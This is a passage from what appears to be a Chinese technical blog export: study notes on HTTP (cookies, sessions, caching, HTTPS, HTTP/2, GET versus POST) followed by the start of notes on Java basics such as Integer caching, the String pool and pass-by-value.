HTML 页面资源，还会请求图片资源。如果每进行一次 HTTP 通信就要新建一个 TCP 连接，那么开销会很大。\n长连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。\n 从 HTTP/1.1 开始默认是长连接的，如果要断开连接，需要由客户端或者服务器端提出断开，使用 Connection : close； 在 HTTP/1.1 之前默认是短连接的，如果需要使用长连接，则使用 Connection : Keep-Alive。  2. 流水线 默认情况下，HTTP 请求是按顺序发出的，下一个请求只有在当前请求收到响应之后才会被发出。由于会受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间。\n流水线是在同一条长连接上发出连续的请求，而不用等待响应返回，这样可以避免连接延迟。\nCookie HTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。\nCookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器之后向同一服务器再次发起请求时被携带上，用于告知服务端两个请求是否来自同一浏览器。由于之后每次请求都会需要携带 Cookie 数据，因此会带来额外的性能开销（尤其是在移动环境下）。\nCookie 曾一度用于客户端数据的存储，因为当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API（本地存储和会话存储）或 IndexedDB。\n1. 用途  会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息） 个性化设置（如用户自定义设置、主题等） 浏览器行为跟踪（如跟踪分析用户行为等）  2. 创建过程 服务器发送的响应报文包含 Set-Cookie 首部字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中。\nHTTP/1.0 200 OK Content-type: text/html Set-Cookie: yummy_cookie=choco Set-Cookie: tasty_cookie=strawberry [page content] 客户端之后对同一个服务器发送请求时，会从浏览器中取出 Cookie 信息并通过 Cookie 请求首部字段发送给服务器。\nGET /sample_page.html HTTP/1.1 Host: www.example.org Cookie: yummy_cookie=choco; tasty_cookie=strawberry 3. 分类  会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。 持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（max-age）之后就成为了持久性的 Cookie。  Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; 4. 作用域 Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则 Cookie 也包含在子域名中（如 developer.mozilla.org）。\nPath 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F (\u0026quot;/\u0026quot;) 作为路径分隔符，子路径也会被匹配。例如，设置 Path=/docs，则以下地址都会匹配：\n /docs /docs/Web/ /docs/Web/HTTP  5. JavaScript 通过 document.cookie 属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。\ndocument.cookie = \u0026#34;yummy_cookie=choco\u0026#34;; document.cookie = \u0026#34;tasty_cookie=strawberry\u0026#34;; console.log(document.cookie); 6. HttpOnly 标记为 HttpOnly 的 Cookie 不能被 JavaScript 脚本调用。跨站脚本攻击 (XSS) 常常使用 JavaScript 的 document.cookie API 窃取用户的 Cookie 信息，因此使用 HttpOnly 标记可以在一定程度上避免 XSS 攻击。\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly 7. Secure 标记为 Secure 的 Cookie 只能通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。\n8. Session 除了可以将用户信息通过 Cookie 存储在用户浏览器中，也可以利用 Session 存储在服务器端，存储在服务器端的信息更加安全。\nSession 可以存储在服务器上的文件、数据库或者内存中。也可以将 Session 存储在 Redis 这种内存型数据库中，效率会更高。\n使用 Session 维护用户登录状态的过程如下：\n 用户进行登录时，用户提交包含用户名和密码的表单，放入 HTTP 请求报文中； 服务器验证该用户名和密码，如果正确则把用户信息存储到 Redis 中，它在 Redis 中的 Key 称为 Session ID； 服务器返回的响应报文的 Set-Cookie 首部字段包含了这个 Session ID，客户端收到响应报文之后将该 Cookie 值存入浏览器中； 客户端之后对同一个服务器进行请求时会包含该 Cookie 值，服务器收到之后提取出 Session ID，从 Redis 中取出用户信息，继续之前的业务操作。  应该注意 Session ID 的安全性问题，不能让它被恶意攻击者轻易获取，那么就不能产生一个容易被猜到的 Session ID 值。此外，还需要经常重新生成 Session ID。在对安全性要求极高的场景下，例如转账等操作，除了使用 Session 管理用户状态之外，还需要对用户进行重新验证，比如重新输入密码，或者使用短信验证码等方式。\n9. 浏览器禁用 Cookie 此时无法使用 Cookie 来保存用户信息，只能使用 Session。除此之外，不能再将 Session ID 存放到 Cookie 中，而是使用 URL 重写技术，将 Session ID 作为 URL 的参数进行传递。\n10. Cookie 与 Session 选择  Cookie 只能存储 ASCII 码字符串，而 Session 则可以存取任何类型的数据，因此在考虑数据复杂性时首选 Session； Cookie 存储在浏览器中，容易被恶意查看。如果非要将一些隐私数据存在 Cookie 中，可以将 Cookie 值进行加密，然后在服务器进行解密； 对于大型网站，如果用户所有的信息都存储在 Session 中，那么开销是非常大的，因此不建议将所有的用户信息都存储到 Session 中。  缓存 1. 优点  缓解服务器压力； 降低客户端获取资源的延迟：缓存通常位于内存中，读取缓存的速度更快。并且缓存在地理位置上也有可能比源服务器来得近，例如浏览器缓存。  2. 实现方法  让代理服务器进行缓存； 让客户端浏览器进行缓存。  3. Cache-Control HTTP/1.1 通过 Cache-Control 首部字段来控制缓存。\n3.1 禁止进行缓存\nno-store 指令规定不能对请求或响应的任何一部分进行缓存。\nCache-Control: no-store 3.2 强制确认缓存\nno-cache 指令规定缓存服务器需要先向源服务器验证缓存资源的有效性，只有当缓存资源有效才将能使用该缓存对客户端的请求进行响应。\nCache-Control: no-cache 3.3 私有缓存和公共缓存\nprivate 指令规定了将资源作为私有缓存，只能被单独用户所使用，一般存储在用户浏览器中。\nCache-Control: private public 指令规定了将资源作为公共缓存，可以被多个用户所使用，一般存储在代理服务器中。\nCache-Control: public 3.4 缓存过期机制\nmax-age 指令出现在请求报文中，并且缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。\nmax-age 指令出现在响应报文中，表示缓存资源在缓存服务器中保存的时间。\nCache-Control: max-age=31536000 Expires 首部字段也可以用于告知缓存服务器该资源什么时候会过期。\nExpires: Wed, 04 Jul 2012 08:26:05 GMT  在 HTTP/1.1 中，会优先处理 max-age 指令； 在 HTTP/1.0 中，max-age 指令会被忽略掉。  4. 缓存验证 需要先了解 ETag 首部字段的含义，它是资源的唯一标识。URL 不能唯一表示资源，例如 http://www.google.com/ 有中文和英文两个资源，只有 ETag 才能对这两个资源进行唯一标识。\nETag: \u0026#34;82e22293907ce725faf67773957acd12\u0026#34; 可以将缓存资源的 ETag 值放入 If-None-Match 首部，服务器收到该请求后，判断缓存资源的 ETag 值和资源的最新 ETag 值是否一致，如果一致则表示缓存资源有效，返回 304 Not Modified。\nIf-None-Match: \u0026#34;82e22293907ce725faf67773957acd12\u0026#34; Last-Modified 首部字段也可以用于缓存验证，它包含在源服务器发送的响应报文中，指示源服务器对资源的最后修改时间。但是它是一种弱校验器，因为只能精确到一秒，所以它通常作为 ETag 的备用方案。如果响应首部字段里含有这个信息，客户端可以在后续的请求中带上 If-Modified-Since 来验证缓存。服务器只在所请求的资源在给定的日期时间之后对内容进行过修改的情况下才会将资源返回，状态码为 200 OK。如果请求的资源从那时起未经修改，那么返回一个不带有消息主体的 304 Not Modified 响应。\nLast-Modified: Wed, 21 Oct 2015 07:28:00 GMT If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT 内容协商 通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。\n1. 类型 1.1 服务端驱动型\n客户端设置特定的 HTTP 首部字段，例如 Accept、Accept-Charset、Accept-Encoding、Accept-Language，服务器根据这些字段返回特定的资源。\n它存在以下问题：\n 服务器很难知道客户端浏览器的全部信息； 客户端提供的信息相当冗长（HTTP/2 协议的首部压缩机制缓解了这个问题），并且存在隐私风险（HTTP 指纹识别技术）； 给定的资源需要返回不同的展现形式，共享缓存的效率会降低，而服务器端的实现会越来越复杂。  1.2 代理驱动型\n服务器返回 300 Multiple Choices 或者 406 Not Acceptable，客户端从中选出最合适的那个资源。\n2. Vary Vary: Accept-Language 在使用内容协商的情况下，只有当缓存服务器中的缓存满足内容协商条件时，才能使用该缓存，否则应该向源服务器请求该资源。\n例如，一个客户端发送了一个包含 Accept-Language 首部字段的请求之后，源服务器返回的响应包含 Vary: Accept-Language 内容，缓存服务器对这个响应进行缓存之后，在客户端下一次访问同一个 URL 资源，并且 Accept-Language 与缓存中的对应的值相同时才会返回该缓存。\n内容编码 内容编码将实体主体进行压缩，从而减少传输的数据量。\n常用的内容编码有：gzip、compress、deflate、identity。\n浏览器发送 Accept-Encoding 首部，其中包含有它所支持的压缩算法，以及各自的优先级。服务器则从中选择一种，使用该算法对响应的消息主体进行压缩，并且发送 Content-Encoding 首部来告知浏览器它选择了哪一种算法。由于该内容协商过程是基于编码类型来选择资源的展现形式的，在响应的 Vary 首部至少要包含 Content-Encoding。\n范围请求 如果网络出现中断，服务器只发送了一部分数据，范围请求可以使得客户端只请求服务器未发送的那部分数据，从而避免服务器重新发送所有数据。\n1. Range 在请求报文中添加 Range 首部字段指定请求的范围。\nGET /z4d4kWk.jpg HTTP/1.1 Host: i.imgur.com Range: bytes=0-1023 请求成功的话服务器返回的响应包含 206 Partial Content 状态码。\nHTTP/1.1 206 Partial Content Content-Range: bytes 0-1023/146515 Content-Length: 1024 ... (binary content) 2. Accept-Ranges 响应首部字段 Accept-Ranges 用于告知客户端是否能处理范围请求，可以处理使用 bytes，否则使用 none。\nAccept-Ranges: bytes 3. 响应状态码  在请求成功的情况下，服务器会返回 206 Partial Content 状态码。 在请求的范围越界的情况下，服务器会返回 416 Requested Range Not Satisfiable 状态码。 在不支持范围请求的情况下，服务器会返回 200 OK 状态码。  分块传输编码 Chunked Transfer Coding，可以把数据分割成多块，让浏览器逐步显示页面。\n多部分对象集合 一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。\n例如，上传多个表单时可以使用如下方式：\nContent-Type: multipart/form-data; boundary=AaB03x --AaB03x Content-Disposition: form-data; name=\u0026#34;submit-name\u0026#34; Larry --AaB03x Content-Disposition: form-data; name=\u0026#34;files\u0026#34;; filename=\u0026#34;file1.txt\u0026#34; Content-Type: text/plain ... contents of file1.txt ... --AaB03x-- 虚拟主机 HTTP/1.1 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。\n通信数据转发 1. 代理 代理服务器接受客户端的请求，并且转发给其它服务器。\n使用代理的主要目的是：\n 缓存 负载均衡 网络访问控制 访问日志记录  代理服务器分为正向代理和反向代理两种：\n 用户察觉得到正向代理的存在。   而反向代理一般位于内部网络中，用户察觉不到。  2. 网关 与代理服务器不同的是，网关服务器会将 HTTP 转化为其它协议进行通信，从而请求其它非 HTTP 服务器的服务。\n3. 隧道 使用 SSL 等加密手段，在客户端和服务器之间建立一条安全的通信线路。\n六、HTTPs HTTP 有以下安全性问题：\n 使用明文进行通信，内容可能会被窃听； 不验证通信方的身份，通信方的身份有可能遭遇伪装； 无法证明报文的完整性，报文有可能遭篡改。  HTTPs 并不是新协议，而是让 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信，也就是说 HTTPs 使用了隧道进行通信。\n通过使用 SSL，HTTPs 具有了加密（防窃听）、认证（防伪装）和完整性保护（防篡改）。\n加密 1. 对称密钥加密 对称密钥加密（Symmetric-Key Encryption），加密和解密使用同一密钥。\n 优点：运算速度快； 缺点：无法安全地将密钥传输给通信方。  2.非对称密钥加密 非对称密钥加密，又称公开密钥加密（Public-Key Encryption），加密和解密使用不同的密钥。\n公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。\n非对称密钥除了用来加密，还可以用来进行签名。因为私有密钥无法被其他人获取，因此通信发送方使用其私有密钥进行签名，通信接收方使用发送方的公开密钥对签名进行解密，就能判断这个签名是否正确。\n 优点：可以更安全地将公开密钥传输给通信发送方； 缺点：运算速度慢。  3. HTTPs 采用的加密方式 HTTPs 采用混合的加密机制，使用非对称密钥加密用于传输对称密钥来保证传输过程的安全性，之后使用对称密钥加密进行通信来保证通信过程的效率。（下图中的 Session Key 就是对称密钥）\n认证 通过使用 证书 来对通信方进行认证。\n数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。\n服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。\n进行 HTTPs 通信时，服务器会把证书发送给客户端。客户端取得其中的公开密钥之后，先使用数字签名进行验证，如果验证通过，就可以开始通信了。\n通信开始时，客户端需要使用服务器的公开密钥将自己的私有密钥传输给服务器，之后再进行对称密钥加密。\n完整性保护 SSL 提供报文摘要功能来进行完整性保护。\nHTTP 也提供了 MD5 报文摘要功能，但不是安全的。例如报文内容被篡改之后，同时重新计算 MD5 的值，通信接收方是无法意识到发生了篡改。\nHTTPs 的报文摘要功能之所以安全，是因为它结合了加密和认证这两个操作。试想一下，加密之后的报文，遭到篡改之后，也很难重新计算报文摘要，因为无法轻易获取明文。\nHTTPs 的缺点  因为需要进行加密解密等过程，因此速度会更慢； 需要支付证书授权的高额费用。  七、HTTP/2.0 HTTP/1.x 缺陷 HTTP/1.x 实现简单是以牺牲性能为代价的：\n 客户端需要使用多个连接才能实现并发和缩短延迟； 不会压缩请求和响应首部，从而导致不必要的网络流量； 不支持有效的资源优先级，致使底层 TCP 连接的利用率低下。  二进制分帧层 HTTP/2.0 将报文分成 HEADERS 帧和 DATA 帧，它们都是二进制格式的。\n在通信过程中，只会有一个 TCP 连接存在，它承载了任意数量的双向数据流（Stream）。\n 一个数据流（Stream）都有一个唯一标识符和可选的优先级信息，用于承载双向信息。 消息（Message）是与逻辑请求或响应对应的完整的一系列帧。 帧（Frame）是最小的通信单位，来自不同数据流的帧可以交错发送，然后再根据每个帧头的数据流标识符重新组装。  服务端推送 HTTP/2.0 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 page.html 页面，服务端就把 script.js 和 style.css 等与之相关的资源一起发给客户端。\n首部压缩 HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。\nHTTP/2.0 要求客户端和服务器同时维护和更新一个包含之前见过的首部字段表，从而避免了重复传输。\n不仅如此，HTTP/2.0 也使用 Huffman 编码对首部字段进行压缩。\n八、HTTP/1.1 新特性 详细内容请见上文\n  默认是长连接\n  支持流水线\n  支持同时打开多个 TCP 连接\n  支持虚拟主机\n  新增状态码 100\n  支持分块传输编码\n  新增缓存处理指令 max-age\n  九、GET 和 POST 比较 作用 GET 用于获取资源，而 POST 用于传输实体主体。\n参数 GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在实体主体中。不能因为 POST 参数存储在实体主体中就认为它的安全性更高，因为照样可以通过一些抓包工具（Fiddler）查看。\n因为 URL 只支持 ASCII 码，因此 GET 的参数中如果存在中文等字符就需要先进行编码。例如 中文 会转换为 %E4%B8%AD%E6%96%87，而空格会转换为 %20。POST 参考支持标准字符集。\nGET /test/demo_form.asp?name1=value1\u0026amp;name2=value2 HTTP/1.1 POST /test/demo_form.asp HTTP/1.1 Host: w3schools.com name1=value1\u0026amp;name2=value2 安全 安全的 HTTP 方法不会改变服务器状态，也就是说它只是可读的。\nGET 方法是安全的，而 POST 却不是，因为 POST 的目的是传送实体主体内容，这个内容可能是用户上传的表单数据，上传成功之后，服务器可能把这个数据存储到数据库中，因此状态也就发生了改变。\n安全的方法除了 GET 之外还有：HEAD、OPTIONS。\n不安全的方法除了 POST 之外还有 PUT、DELETE。\n幂等性 幂等的 HTTP 方法，同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。\n所有的安全方法也都是幂等的。\n在正确实现的条件下，GET，HEAD，PUT 和 DELETE 等方法都是幂等的，而 POST 方法不是。\nGET /pageX HTTP/1.1 是幂等的，连续调用多次，客户端接收到的结果都是一样的：\nGET /pageX HTTP/1.1 GET /pageX HTTP/1.1 GET /pageX HTTP/1.1 GET /pageX HTTP/1.1 POST /add_row HTTP/1.1 不是幂等的，如果调用多次，就会增加多行记录：\nPOST /add_row HTTP/1.1 -\u0026gt; Adds a 1nd row POST /add_row HTTP/1.1 -\u0026gt; Adds a 2nd row POST /add_row HTTP/1.1 -\u0026gt; Adds a 3rd row DELETE /idX/delete HTTP/1.1 是幂等的，即便不同的请求接收到的状态码不一样：\nDELETE /idX/delete HTTP/1.1 -\u0026gt; Returns 200 if idX exists DELETE /idX/delete HTTP/1.1 -\u0026gt; Returns 404 as it just got deleted DELETE /idX/delete HTTP/1.1 -\u0026gt; Returns 404 可缓存 如果要对响应进行缓存，需要满足以下条件：\n 请求报文的 HTTP 方法本身是可缓存的，包括 GET 和 HEAD，但是 PUT 和 DELETE 不可缓存，POST 在多数情况下不可缓存的。 响应报文的状态码是可缓存的，包括：200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501。 响应报文的 Cache-Control 首部字段没有指定不进行缓存。  XMLHttpRequest 为了阐述 POST 和 GET 的另一个区别，需要先了解 XMLHttpRequest：\n XMLHttpRequest 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。\n  在使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。 而 GET 方法 Header 和 Data 会一起发送。  参考资料  上野宣. 图解 HTTP[M]. 人民邮电出版社, 2014. MDN : HTTP HTTP/2 简介 htmlspecialchars Difference between file URI and URL in java How to Fix SQL Injection Using Java PreparedStatement \u0026amp; CallableStatement 浅谈 HTTP 中 Get 与 Post 的区别 Are http:// and www really necessary? HTTP (HyperText Transfer Protocol) Web-VPN: Secure Proxies with SPDY \u0026amp; Chrome File:HTTP persistent connection.svg Proxy server What Is This HTTPS/SSL Thing And Why Should You Care? What is SSL Offloading? Sun Directory Server Enterprise Edition 7.0 Reference - Key Encryption An Introduction to Mutual SSL Authentication The Difference Between URLs and URIs Cookie 与 Session 的区别 COOKIE 和 SESSION 有什么区别 Cookie/Session 的机制与安全 HTTPS 证书原理 What is the difference between a URI, a URL and a URN? XMLHttpRequest XMLHttpRequest (XHR) Uses Multiple Packets for HTTP POST? Symmetric vs. Asymmetric Encryption – What are differences? Web 性能优化与 HTTP/2 HTTP/2 简介  ","permalink":"https://www.fenghong.tech/blog/intro/http/","tags":["http"],"title":"http 基本原理"},{"categories":["ops"],"contents":"[TOC]\n一、数据类型 包装类型 八个基本类型：\n boolean/1 byte/8 char/16 short/16 int/32 float/32 long/64 double/64  基本类型都有对应的包装类型，基本类型与其对应的包装类型之间的赋值使用自动装箱与拆箱完成。\nInteger x = 2; // 装箱 int y = x; // 拆箱 缓存池 new Integer(123) 与 Integer.valueOf(123) 的区别在于：\n new Integer(123) 每次都会新建一个对象； Integer.valueOf(123) 会使用缓存池中的对象，多次调用会取得同一个对象的引用。  Integer x = new Integer(123); Integer y = new Integer(123); System.out.println(x == y); // false Integer z = Integer.valueOf(123); Integer k = Integer.valueOf(123); System.out.println(z == k); // true valueOf() 方法的实现比较简单，就是先判断值是否在缓存池中，如果在的话就直接返回缓存池的内容。\npublic static Integer valueOf(int i) { if (i \u0026gt;= IntegerCache.low \u0026amp;\u0026amp; i \u0026lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i); } 在 Java 8 中，Integer 缓存池的大小默认为 -128~127。\nstatic final int low = -128; static final int high; static final Integer cache[]; static { // high value may be configured by property  int h = 127; String integerCacheHighPropValue = sun.misc.VM.getSavedProperty(\u0026#34;java.lang.Integer.IntegerCache.high\u0026#34;); if (integerCacheHighPropValue != null) { try { int i = parseInt(integerCacheHighPropValue); i = Math.max(i, 127); // Maximum array size is Integer.MAX_VALUE  h = Math.min(i, Integer.MAX_VALUE - (-low) -1); } catch( NumberFormatException nfe) { // If the property cannot be parsed into an int, ignore it.  } } high = h; cache = new Integer[(high - low) + 1]; int j = low; for(int k = 0; k \u0026lt; cache.length; k++) cache[k] = new Integer(j++); // range [-128, 127] must be interned (JLS7 5.1.7)  assert IntegerCache.high \u0026gt;= 127; } 编译器会在自动装箱过程调用 valueOf() 方法，因此多个 Integer 实例使用自动装箱来创建并且值相同，那么就会引用相同的对象。\nInteger m = 123; Integer n = 123; System.out.println(m == n); // true 基本类型对应的缓冲池如下：\n boolean values true and false all byte values short values between -128 and 127 int values between -128 and 127 char in the range \\u0000 to \\u007F  在使用这些基本类型对应的包装类型时，就可以直接使用缓冲池中的对象。\nStackOverflow : Differences between new Integer(123), Integer.valueOf(123) and just 123 \n二、String 概览 String 被声明为 final，因此它不可被继承。\n内部使用 char 数组存储数据，该数组被声明为 final，这意味着 value 数组初始化之后就不能再引用其它数组。并且 String 内部没有改变 value 数组的方法，因此可以保证 String 不可变。\npublic final class String implements java.io.Serializable, Comparable\u0026lt;String\u0026gt;, CharSequence { /** The value is used for character storage. */ private final char value[]; 不可变的好处 1. 可以缓存 hash 值\n因为 String 的 hash 值经常被使用，例如 String 用做 HashMap 的 key。不可变的特性可以使得 hash 值也不可变，因此只需要进行一次计算。\n2. String Pool 的需要\n如果一个 String 对象已经被创建过了，那么就会从 String Pool 中取得引用。只有 String 是不可变的，才可能使用 String Pool。\n3. 安全性\nString 经常作为参数，String 不可变性可以保证参数不可变。例如在作为网络连接参数的情况下如果 String 是可变的，那么在网络连接过程中，String 被改变，改变 String 对象的那一方以为现在连接的是其它主机，而实际情况却不一定是。\n4. 线程安全\nString 不可变性天生具备线程安全，可以在多个线程中安全地使用。\nProgram Creek : Why String is immutable in Java?\nString, StringBuffer and StringBuilder 1. 可变性\n String 不可变 StringBuffer 和 StringBuilder 可变  2. 线程安全\n String 不可变，因此是线程安全的 StringBuilder 不是线程安全的 StringBuffer 是线程安全的，内部使用 synchronized 进行同步  StackOverflow : String, StringBuffer, and StringBuilder\nString Pool 字符串常量池（String Pool）保存着所有字符串字面量（literal strings），这些字面量在编译时期就确定。不仅如此，还可以使用 String 的 intern() 方法在运行过程中将字符串添加到 String Pool 中。\n当一个字符串调用 intern() 方法时，如果 String Pool 中已经存在一个字符串和该字符串值相等（使用 equals() 方法进行确定），那么就会返回 String Pool 中字符串的引用；否则，就会在 String Pool 中添加一个新的字符串，并返回这个新字符串的引用。\n下面示例中，s1 和 s2 采用 new String() 的方式新建了两个不同字符串，而 s3 和 s4 是通过 s1.intern() 方法取得一个字符串引用。intern() 首先把 s1 引用的字符串放到 String Pool 中，然后返回这个字符串引用。因此 s3 和 s4 引用的是同一个字符串。\nString s1 = new String(\u0026#34;aaa\u0026#34;); String s2 = new String(\u0026#34;aaa\u0026#34;); System.out.println(s1 == s2); // false String s3 = s1.intern(); String s4 = s1.intern(); System.out.println(s3 == s4); // true 如果是采用 \u0026ldquo;bbb\u0026rdquo; 这种字面量的形式创建字符串，会自动地将字符串放入 String Pool 中。\nString s5 = \u0026#34;bbb\u0026#34;; String s6 = \u0026#34;bbb\u0026#34;; System.out.println(s5 == s6); // true 在 Java 7 之前，String Pool 被放在运行时常量池中，它属于永久代。而在 Java 7，String Pool 被移到堆中。这是因为永久代的空间有限，在大量使用字符串的场景下会导致 OutOfMemoryError 错误。\n StackOverflow : What is String interning? 深入解析 String#intern  new String(\u0026ldquo;abc\u0026rdquo;) 使用这种方式一共会创建两个字符串对象（前提是 String Pool 中还没有 \u0026ldquo;abc\u0026rdquo; 字符串对象）。\n \u0026ldquo;abc\u0026rdquo; 属于字符串字面量，因此编译时期会在 String Pool 中创建一个字符串对象，指向这个 \u0026ldquo;abc\u0026rdquo; 字符串字面量； 而使用 new 的方式会在堆中创建一个字符串对象。  创建一个测试类，其 main 方法中使用这种方式来创建字符串对象。\npublic class NewStringTest { public static void main(String[] args) { String s = new String(\u0026#34;abc\u0026#34;); } } 使用 javap -verbose 进行反编译，得到以下内容：\n// ... Constant pool: // ...  #2 = Class #18 // java/lang/String  #3 = String #19 // abc // ...  #18 = Utf8 java/lang/String #19 = Utf8 abc // ...  public static void main(java.lang.String[]); descriptor: ([Ljava/lang/String;)V flags: ACC_PUBLIC, ACC_STATIC Code: stack=3, locals=2, args_size=1 0: new #2 // class java/lang/String  3: dup 4: ldc #3 // String abc  6: invokespecial #4 // Method java/lang/String.\u0026#34;\u0026lt;init\u0026gt;\u0026#34;:(Ljava/lang/String;)V  9: astore_1 // ... 在 Constant Pool 中，#19 存储这字符串字面量 \u0026ldquo;abc\u0026rdquo;，#3 是 String Pool 的字符串对象，它指向 #19 这个字符串字面量。在 main 方法中，0: 行使用 new #2 在堆中创建一个字符串对象，并且使用 ldc #3 将 String Pool 中的字符串对象作为 String 构造函数的参数。\n以下是 String 构造函数的源码，可以看到，在将一个字符串对象作为另一个字符串对象的构造函数参数时，并不会完全复制 value 数组内容，而是都会指向同一个 value 数组。\npublic String(String original) { this.value = original.value; this.hash = original.hash; } 三、运算 参数传递 Java 的参数是以值传递的形式传入方法中，而不是引用传递。\n以下代码中 Dog dog 的 dog 是一个指针，存储的是对象的地址。在将一个参数传入一个方法时，本质上是将对象的地址以值的方式传递到形参中。因此在方法中使指针引用其它对象，那么这两个指针此时指向的是完全不同的对象，在一方改变其所指向对象的内容时对另一方没有影响。\npublic class Dog { String name; Dog(String name) { this.name = name; } String getName() { return this.name; } void setName(String name) { this.name = name; } String getObjectAddress() { return super.toString(); } } public class PassByValueExample { public static void main(String[] args) { Dog dog = new Dog(\u0026#34;A\u0026#34;); System.out.println(dog.getObjectAddress()); // Dog@4554617c  func(dog); System.out.println(dog.getObjectAddress()); // Dog@4554617c  System.out.println(dog.getName()); // A  } private static void func(Dog dog) { System.out.println(dog.getObjectAddress()); // Dog@4554617c  dog = new Dog(\u0026#34;B\u0026#34;); System.out.println(dog.getObjectAddress()); // Dog@74a14482  System.out.println(dog.getName()); // B  } } 如果在方法中改变对象的字段值会改变原对象该字段值，因为改变的是同一个地址指向的内容。\nclass PassByValueExample { public static void main(String[] args) { Dog dog = new Dog(\u0026#34;A\u0026#34;); func(dog); System.out.println(dog.getName()); // B  } private static void func(Dog dog) { dog.setName(\u0026#34;B\u0026#34;); } } StackOverflow: Is Java “pass-by-reference” or “pass-by-value”?\nfloat 与 double Java 不能隐式执行向下转型，因为这会使得精度降低。\n1.1 字面量属于 double 类型，不能直接将 1.1 直接赋值给 float 变量，因为这是向下转型。\n// float f = 1.1; 1.1f 字面量才是 float 类型。\nfloat f = 1.1f; 隐式类型转换 因为字面量 1 是 int 类型，它比 short 类型精度要高，因此不能隐式地将 int 类型下转型为 short 类型。\nshort s1 = 1; // s1 = s1 + 1; 但是使用 += 或者 ++ 运算符可以执行隐式类型转换。\ns1 += 1; // s1++; 上面的语句相当于将 s1 + 1 的计算结果进行了向下转型：\ns1 = (short) (s1 + 1); StackOverflow : Why don\u0026rsquo;t Java\u0026rsquo;s +=, -=, *=, /= compound assignment operators require casting?\nswitch 从 Java 7 开始，可以在 switch 条件判断语句中使用 String 对象。\nString s = \u0026#34;a\u0026#34;; switch (s) { case \u0026#34;a\u0026#34;: System.out.println(\u0026#34;aaa\u0026#34;); break; case \u0026#34;b\u0026#34;: System.out.println(\u0026#34;bbb\u0026#34;); break; } switch 不支持 long，是因为 switch 的设计初衷是对那些只有少数的几个值进行等值判断，如果值过于复杂，那么还是用 if 比较合适。\n// long x = 111; // switch (x) { // Incompatible types. Found: \u0026#39;long\u0026#39;, required: \u0026#39;char, byte, short, int, Character, Byte, Short, Integer, String, or an enum\u0026#39; // case 111: // System.out.println(111); // break; // case 222: // System.out.println(222); // break; // } StackOverflow : Why can\u0026rsquo;t your switch statement data type be long, Java?\n四、继承 访问权限 Java 中有三个访问权限修饰符：private、protected 以及 public，如果不加访问修饰符，表示包级可见。\n可以对类或类中的成员（字段以及方法）加上访问修饰符。\n 类可见表示其它类可以用这个类创建实例对象。 成员可见表示其它类可以用这个类的实例对象访问到该成员；  protected 用于修饰成员，表示在继承体系中成员对于子类可见，但是这个访问修饰符对于类没有意义。\n设计良好的模块会隐藏所有的实现细节，把它的 API 与它的实现清晰地隔离开来。模块之间只通过它们的 API 进行通信，一个模块不需要知道其他模块的内部工作情况，这个概念被称为信息隐藏或封装。因此访问权限应当尽可能地使每个类或者成员不被外界访问。\n如果子类的方法重写了父类的方法，那么子类中该方法的访问级别不允许低于父类的访问级别。这是为了确保可以使用父类实例的地方都可以使用子类实例，也就是确保满足里氏替换原则。\n字段决不能是公有的，因为这么做的话就失去了对这个字段修改行为的控制，客户端可以对其随意修改。例如下面的例子中，AccessExample 拥有 id 公有字段，如果在某个时刻，我们想要使用 int 存储 id 字段，那么就需要修改所有的客户端代码。\npublic class AccessExample { public String id; } 可以使用公有的 getter 和 setter 方法来替换公有字段，这样的话就可以控制对字段的修改行为。\npublic class AccessExample { private int id; public String getId() { return id + \u0026#34;\u0026#34;; } public void 